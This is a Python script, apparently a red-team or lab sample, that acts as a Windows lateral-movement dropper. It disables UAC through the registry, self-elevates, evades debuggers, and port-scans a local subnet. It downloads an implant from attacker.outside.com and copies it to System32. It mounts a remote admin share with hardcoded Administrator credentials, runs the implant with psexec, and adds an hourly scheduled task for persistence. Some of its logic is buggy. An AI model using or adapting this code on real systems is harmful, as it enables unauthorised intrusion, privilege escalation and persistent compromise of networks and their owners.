import time
import urllib.request, urllib.parse, urllib.error
import subprocess
import shutil
import os
import win32com
import win32com.shell.shell as shell
import ctypes
import sys
import wmi
import winreg
import socket
import subprocess
import asyncio
import queue
import threading
from concurrent.futures import ThreadPoolExecutor
from datetime import datetime
import re
from errno import ECONNREFUSED
from functools import partial
from multiprocessing import Pool




'''
By Moses Hernandez, Please excuse my horrible python skillz. Because you know I did this in like 20 minutes.
This script does a few things.
First it connects to another computer
Then it dowloads a file over http
Then it copies that file to the new computer
Then it uses the at command
Then it goes ahead and leverages that at command within the system to launch the new file
'''

NUM_THREADS = 4
ASADMIN = 'asadmin'
pexecPath = 'C:\\temp\\psexec.exe'
cmdshell = "cmd.exe"
computers = ["dc","jumpbox-PC","NOTAVICTIM7"]
kernel32 = ctypes.WinDLL("kernel32", use_last_error=True)
IsDebuggerPresent = kernel32.IsDebuggerPresent
remoteNet = "192.168.251."
execName = 'mybatch.exe'
implantName = 'iis.exe'


host = ''
max_port = 1024
min_port = 1
debug = 1

def CompTest(run):
    run = 0

    try:
        for i in computers:
            if debug == 1:
                print ("Current test is " + i)
            if i == os.environ['COMPUTERNAME']:
                if i != computers:
                    run = 0
                elif i == computers:
                    run = 1
                else:
                    pass

        if debug == 1:
            print("Run")
        return run

    except Exception as e:
        print(e)


def disable_UAC():
    try:
        command1 = 'reg delete HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System /v EnableLUA'
        shell.ShellExecuteEx(lpVerb='runas', lpFile='cmd.exe', lpParameters='/c ' + command1)
        command2 = 'reg add HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System /v EnableLUA /t REG_DWORD /d 0 /f'
        shell.ShellExecuteEx(lpVerb='runas', lpFile='cmd.exe', lpParameters='/c ' + command2)
    except:
        print("cannot disable UAC.... this time")

def check_UAC():
    try:
        key_dir = r"SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System"
        reg = winreg.OpenKey(winreg.HKEY_LOCAL_MACHINE, key_dir, 0, winreg.KEY_WOW64_64KEY+winreg.KEY_ALL_ACCESS)
        test_dir = list(winreg.QueryValueEx(reg, r'EnableLUA'))[0]
        if test_dir == 0:
            pass
        if test_dir != 0:
            disable_UAC()
            exit(0)
    except:
        pass


def download_File(filetoDownload):
    try:
        g = urllib.request.urlopen('http://attacker.outside.com/%s' % filetoDownload)
        if debug == 1:
            print(g)
        with open(filetoDownload, 'b+w') as f:
            f.write(g.read())
        shutil.copy(filetoDownload,'C:\\Windows\\System32\\')
        exit()
        if debug == 1:
            print ("Wee!")

    except:
        if debug == 1:
            print ("Broken!")
        pass

def download_Implant():
    if debug == 1:
        print("Downloading Implant")
    try:
        g = urllib.request.urlopen('http://attacker.outside.com/iis.exe')
        if debug == 1:
            print(g)
        with open(implantName, 'b+w') as f:
            f.write(g.read())
        exit()
        if debug == 1:
            print ("Wee!")
    except:
        if debug == 1:
            print ("Broken!")
        pass

def scan_host(host, port, r_code = 1):
    try:
        socket.setdefaulttimeout(2)
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.connect((host, port))
        print("  [+]  %d open" % port)
        s.close()
    except ConnectionRefusedError as e:
        print("  [+] %d closed" % port)
    except socket.timeout:
        pass
    return r_code

def implant_Copy():
    if debug ==1 :
        print("print Entering the Copy portion")
    try:
        if os.getcwd() == 'C:\\dev\\test':
            shutil.copy('dist\\mybatch.exe','C:\\Windows\\System32')
        elif os.getcwd() == os.path.expanduser("~"):
            shutil.copy('os.path.join(os.path.expanduser("~"), "Downloads")','C:\\Windows\\System32\\')
        else:
            shutil.copy(execName,'C:\\Windows\\System32\\')
            shutil.copy(implantName,'C:\\windows\\System32')
    except shutil.Error as e:
        if debug == 1:
            print("This is shutil.Error as e Section.")
            print("Error: %s" % e)
    except IOError as e:
        if debug == 1:
            print("This is the IOError as e section")
            print("Error %s" % e.strerror)
    except:
        pass

def computer_Scheduler():
    if debug == 1:
        print ('Enterping Scheduler')
    subprocess.Popen(r'schtasks /Delete /TN MyBatch /F')
    subprocess.Popen(r'net use Z: \\pci.example.com\c$ /user:example.com\Administrator cisco')
    try:
        if os.path.isfile(implantName):
            shutil.copy(implantName, "Z:\\Windows\\system32\\iis.exe")
    except shutil.Error as e:
        pass

    try:
        if os.path.isfile("C:\\windows\\system32\\psexec.exe"):
            print("Great")
        else:
            filetoDownload = ''
            download_File(filetoDownload)

    except Exception as e:
        pass

    if os.path.isfile("C:\\windows\\system32\\psexec.exe"):
        try:
            psexecer = 'psexec.exe','/accepteula','\\\pci.example.com','-u','example.com\\administrator','-p','cisco','C:\\windows\\system32\\iis.exe'
            psexecopen = subprocess.Popen(psexecer, shell=True, stdout=subprocess.PIPE)
        except:
            pass

    try:
        subprocess.Popen(r"net use Z: /d")
        subprocess.Popen(r'schtasks /Create /SC HOURLY /MO 1 /TN MyBatch /TR "cmd /k START /B C:\\Windows\\System32\\mybatch.exe"')

    except Exception as e:
        pass

if __name__ == '__main__':

    try:
        print('''





          "HI! These are not the droids your looking for....

          ....Move on."






        ''')

        if sys.argv[-1] != ASADMIN:
            check_UAC()
            script = os.path.abspath(sys.argv[0])
            params = ' '.join([script] + sys.argv[1:] + [ASADMIN])
            shell.ShellExecuteEx(lpVerb='runas', lpFile=sys.executable, lpParameters=params)


        if IsDebuggerPresent == True:
            print ("Debugger!")
            sys.exit(1)
        else:
            pass

        run = ''

        CompTest(run)
        if run == 0:
            sys.exit(1)

        hosts = []
        port = 0

        for ip in range(7,15):
            netRange = '192.168.31.'
            host = netRange + str(ip)
            hosts.append(host)

        for host in hosts:
            scan_ports = [80,135,443,445,137]
            if debug == 1:
                 print ("[***] Starting a Portscan on host %s:\n" % host )
            for port in scan_ports:
                response = scan_host(host, port)

        download_Implant()
        implant_Copy()
        computer_Scheduler()

    except KeyboardInterrupt:
        sys.exit(1)
